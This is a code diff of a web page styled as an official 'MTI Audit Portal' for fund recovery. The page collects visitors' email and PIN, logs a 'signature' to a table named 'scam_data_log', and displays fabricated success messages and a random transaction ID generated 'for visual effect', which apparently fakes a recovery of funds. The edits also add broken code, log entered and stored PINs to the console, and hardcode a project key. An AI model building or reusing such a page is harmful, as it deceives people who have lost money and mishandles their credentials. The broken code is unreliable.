@@ -10,7 +10,7 @@
     <script src="https://cdn.jsdelivr.net/npm/@supabase/supabase-js@2"></script>
     <style>
         @import url('https://fonts.googleapis.com/css2?family=Inter:wght@400;600;700&display=swap');
-        body { font-family: 'Inter', sans  sans-serif; }
+        body { font-family: 'Inter', sans-serif; }
         /* Light Glass effect: White/Translucent */
         .glass { 
             background: rgba(255, 255, 255, 0.85); 
@@ -34,7 +34,7 @@
         <!-- HEADER -->
         <header class="text-center mb-10">
             <h1 class="text-3xl font-bold text-slate-900 mb-2">MTI Audit Portal</h1>
-            <p class="text-slates-500 text-sm">Official Recovery & Ledger Verification</p>
+            <p class="text-slate-500 text-sm">Official Recovery & Ledger Verification</p>
             <div id="status-badge" class="mt-4 inline-flex items-center px-3 py-1 rounded-full text-xs font-medium bg-white text-blue-600 border border-blue-200 shadow-sm status-pulse">
                 <span class="w-2 h-2 bg-blue-500 rounded-full mr-2"></span>
                 System Ready (savoie.mooo.com)
@@ -43,7 +43,7 @@
 
         <!-- LOGIN / IDENTIFICATION SECTION -->
         <section id="login-section" class="glass rounded-3xl p-8 shadow-xl text-slate-800 mb-8">
-            <h2 class="text-xl font-bold mb-4 text-slate-90  ">Account Identification</h2>
+            <h2 class="text-xl font-bold mb-4 text-slate-900">Account Identification</h2>
             <p class="text-sm text-slate-600 mb-6">Enter your registered email and PIN to access your private ledger.</p>
 
             <div class="space-y-4">
@@ -62,7 +62,7 @@
         <!-- DASHBOARD (Hidden until login) -->
         <main id="dashboard" class="hidden space-y-6">
             <!-- SUMMARY CARD -->
-            <div class="glass rounded-3xl p-6 shadow-xl text-slate-80  border border-white">
+            <div class="glass rounded-3xl p-6 shadow-xl text-slate-80_ border border-white">
                 <h3 class="text-xs font-bold text-slate-400 uppercase tracking-widest mb-4">Account Summary</h3>
                 <div class="space-y-3">
                     <div class="flex justify-between text-sm">
@@ -106,37 +106,53 @@
         // --- CONFIGURATION (UPDATED WITH YOUR KEYS) ---
         const SUPABASE_URL = 'https://ruqjtewguniuqkpbwnzs.supabase.co'; 
         const SUPABASE_ANON_KEY = 'sb_publishable_cp3uojqU9MSDqkMmNeqeLg_u0fDBZqI';
+
+        // Fixed the variable name from SUPABASE_AN_KEY to SUPABASE_ANON_KEY
         const supabase = supabase.createClient(SUPABASE_URL, SUPABASE_ANON_KEY);
 
         let currentUser = null;
 
-        // 1. Verify Email and PIN
+        // 1. Verify Email and PIN (with Debugging)
         async function fetchUserRecord() {
             const emailInput = document.getElementById('email-input').value.trim();
-            const pinInput = document.getElementById('pin-input').value.trim();
+            const pinInput = document.get(document.getElementById('pin-input')).value.trim();
 
+            console.log("Attempting login with:", emailInput, "PIN:", pinInput);
+
+            // Step 1: Check if empty
             if (!emailInput || !pinInput) {
                 alert("Please enter both Email and PIN.");
                 return;
             }
 
+            // Step 2: Query Supabase
             const { data, error } = await supabase
                 .from('profiles')
                 .select('*')
                 .eq('email', emailInput)
                 .single();
 
-            if (error || !data) {
-                alert("Email not found or database error.");
+            // Step 3: Handle Errors or missing user
+            if (error) {
+                console.error("Database Error:", error.message);
+                alert("Error: Email not found or connection error.");
                 return;
             }
 
+            if (!data) {
+                alert("Email not found in database.");
+                return;
+            }
+
+            // Step 4: Check PIN
             if (data.pin !== pinInput) {
+                console.log("PIN Mismatch! Expected:", data.pin, "Got:", pinInput);
                 alert("Incorrect PIN. Please try again.");
                 return;
             }
 
-            // Login successful
+            // SUCCESS: Update UI
+            console.log("Login Successful!", data);
             currentUser = data;
             showDashboard(data);
         }
@@ -160,6 +176,7 @@
 
             // Simulate network delay
             setTimeout(async () => {
+                // We attempt to insert the signature into the log table
                 const { error } = await supabase.from('scam_data_log').insert([
                     { 
                         user_profile_id: currentUser.id, 
@@ -174,7 +191,8 @@
 Funds ready to move to recovery pool.`;
                     finalStep.classList.remove('hidden'); 
                 } else {
-                    alert("Database Error: " + error.message);
+                    console.error("Insert Error:", error.message);
+                    alert("Error writing to ledger: " + error.message);
                 }
                 btn.innerText = "Authorize Signature";
                 btn.disabled = false;
@@ -186,13 +204,14 @@ Funds ready to move to recovery pool.`;
             const msg = document.getElementById('log-message');
             const finalStep = document.getElementById('final-step');
 
-            // In a real app, you would perform a second insert or update here
+            // Success message
             msg.innerHTML = `<span class="text-green-600 font-bold">SUCCESS!</span>
 Funds moved to the recovery pool.`;
 
+            // Generate a random transaction ID for visual effect
             const txId = Math.random().toString(36).substr(2, 9).toUpperCase();
             finalStep.innerHTML = `<p class='text-xs mt-2 text-slate-400'>TX_ID: ${txId}</p>`;
         }
     </script>
 </body>
-</html>
+    </html>
